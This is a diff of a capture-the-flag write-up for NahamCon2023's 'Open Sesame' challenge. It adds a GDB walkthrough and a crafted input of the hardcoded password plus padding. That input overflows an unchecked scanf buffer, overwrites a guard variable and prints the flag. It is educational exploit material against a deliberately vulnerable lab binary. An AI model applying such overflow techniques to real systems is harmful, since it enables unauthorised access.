@@ -2,7 +2,7 @@
 title: NahamCon2023 - Open Sesame
 date: 2023-06-19 09:00:00 +0800
 categories: [NahamCon2023, Binary Exploitation]
-tags: [binary-exploitation, pwn, buffer-overflow]
+tags: [binary-exploitation, pwn, buffer-overflow, gdb]
 img_path: /assets/img/ctfs/nahamcon2023/open-sesame/
 ---
 
@@ -76,6 +76,8 @@ int main() {
 }
 ```
 
+### Analysis
+
 The program starts by calling the function `caveOfGold()`, it creates a `256` byte buffer and does a `scanf("%s")` without specifying a read size, which makes it vulnerable to `buffer overflow`.
 
 In case the `caveCanOpen` variable is set to `no`, an error message is displayed and the program exits, otherwise `isPasswordCorrect()` is called which checks if the password entered is the same as the one the program has hardcoded `#define SECRET_PASS "OpenSesame!!!"` and calls the `flag()` function which displays the flag for the challenge.
@@ -96,7 +98,7 @@ if (caveCanOpen == no) {
 
 ## Debugging
 
-I will explain the whole debugging process from the beginning, if you just want the solution you can skip to the Exploitation section.
+I will explain the whole debugging process from the beginning, if you just want the solution you can skip to the [Exploitation](#exploitation) section.
 
 > I am using the version of GDB with GEF (GDB Enhanced Features) that you can download from [here](https://github.com/hugsy/gef).
 {: .prompt-info }
@@ -185,5 +187,119 @@ End of assembler dump.
 {: .nolineno }
 
 In the function disassembly code, we can see two things:
-- `[...] <+58>: read rax,[rbp-0x110]`, `rbp-0x110` is the address where our input is stored
+- `[...] <+58>: read rax,[rbp-0x110]`, `rbp-0x110` is where the input is stored
 - `[...] <+88>: cmp DWORD PTR [rbp-0x4],0x0`, `rbp-0x4` is the static variable caveCanOpen.
+
+Lets set a breakpoint just before the `caveCanOpen == no` check (`cmp DWORD PTR [rbp-0x4],0x0`).
+
+```bash
+gef➤  b *0x555555555243
+Breakpoint 1 at 0x555555555243
+```
+{: .nolineno }
+
+We are going to run the program again but this time we are going to put `256 "A"` as input to see how the stack is arranged.
+
+```bash
+gef➤  r
+Starting program: /home/kali/ctf/nahamcon2023/open-sesame/open_sesame 
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+BEHOLD THE CAVE OF GOLD
+
+What is the magic enchantment that opens the mouth of the cave?
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Breakpoint 1, 0x0000555555555243 in caveOfGold ()
+[...]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555555236 <caveOfGold+75>  mov    rdi, rax
+   0x555555555239 <caveOfGold+78>  mov    eax, 0x0
+   0x55555555523e <caveOfGold+83>  call   0x555555555080 <__isoc99_scanf@plt>
+●→ 0x555555555243 <caveOfGold+88>  cmp    DWORD PTR [rbp-0x4], 0x0
+   0x555555555247 <caveOfGold+92>  jne    0x555555555264 <caveOfGold+121>
+   0x555555555249 <caveOfGold+94>  lea    rax, [rip+0xe40]        # 0x555555556090
+   0x555555555250 <caveOfGold+101> mov    rdi, rax
+   0x555555555253 <caveOfGold+104> call   0x555555555040 <puts@plt>
+   0x555555555258 <caveOfGold+109> mov    eax, 0x0
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "open_sesame", stopped 0x555555555243 in caveOfGold (), reason: BREAKPOINT
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x555555555243 → caveOfGold()
+[#1] 0x5555555552e4 → main()
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+```
+{: .nolineno }
+
+First we obtain the buffer and variable addresses. Let's also see how the stack is positioned starting from the buffer.
+
+```bash
+gef➤  print $rbp-0x110
+$1 = (void *) 0x7fffffffdc40
+gef➤  print $rbp-0x4
+$2 = (void *) 0x7fffffffdd4c
+```
+{: .nolineno }
+
+![Open Sesame Stack](stack.png)
+
+We can see that both the buffer and the variable are in contiguous regions of memory, and because the buffer is vulnerable to buffer overflow, we can enter enough data to overwrite the variable so that it is no longer 0.
+
+Let's restart the program and try again but this time with `270 "A"`
+
+![Open Sesame Stack Overflow](stack-overflow.png)
+
+Great! we have overwritten the variable, let's see what happens now if we continue with the execution of the program:
+
+```bash
+gef➤  c
+Continuing.
+ERROR, INCORRECT PASSWORD!
+[Inferior 1 (process 90143) exited normally]
+```
+{: .nolineno }
+
+Perfect, we no longer see the `Sorry, the cave will not open right now!` message, which means that we have bypassed the check of the variable when overwriting it and now we get to the execution of the `isPasswordCorrect()` function.
+
+## Exploitation
+
+Let's recap, we know that if we entered `270 characters`, we can overwrite the `caveCanOpen` variable, which allows us to get to `isPasswordCorrect()` which is going to check the input and see if it matches `OpenSesame!!!`.
+
+Let's remember what isPasswordCorrect does:
+
+```c
+Bool isPasswordCorrect(char *input) {
+    return (strncmp(input, SECRET_PASS, strlen(SECRET_PASS)) == 0) ? yes : no;
+}
+```
+{: .nolineno }
+
+Extracts from our input as many characters as the length of the password, and then check that it is the same as `OpenSesame!!!`. Basically, it selects the first `13 characters` of our input and checks that they match the password.
+
+### Crafting the Payload
+
+The plan is simple, instead of sending 270 "A", we will send `OpenSesame!!! + (270 - 13) "A"`, which would look something like this:
+
+```bash
+$ python -c 'print("OpenSesame!!!" + "A" * (270 - 13))'
+OpenSesame!!!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+{: .nolineno }
+
+```bash
+$ ./open_sesame 
+BEHOLD THE CAVE OF GOLD
+
+What is the magic enchantment that opens the mouth of the cave?
+OpenSesame!!!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+YOU HAVE PROVEN YOURSELF WORTHY HERE IS THE GOLD:
+flag{share_the_post_if_you_liked}
+```
+{: .nolineno }
+
+and there we have the flag!
+
+## Final Thoughts
+
+An easy challenge since we had the support of the source code, but still very interesting to practice.
